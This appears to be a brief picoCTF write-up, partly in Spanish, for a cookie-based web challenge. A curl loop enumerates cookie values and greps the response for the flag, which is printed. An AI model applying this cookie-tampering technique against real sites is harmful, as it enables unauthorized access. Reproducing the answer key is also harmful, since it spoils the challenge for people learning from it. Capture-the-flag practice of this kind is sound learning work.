## Objetivo

Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:53554/](http://mercury.picoctf.net:53554/)
## Solución

Simple y sencillamente hicimos una peticion cambiando el numero de la cookie y buscamos algo que coincida con pico{}

```
czarragar-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:6418/check -H "Cookie: name=$i";done | grep "pico" 
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>
czarragar-picoctf@webshell:~$ 
```

## Notas adicionales

## Referencias


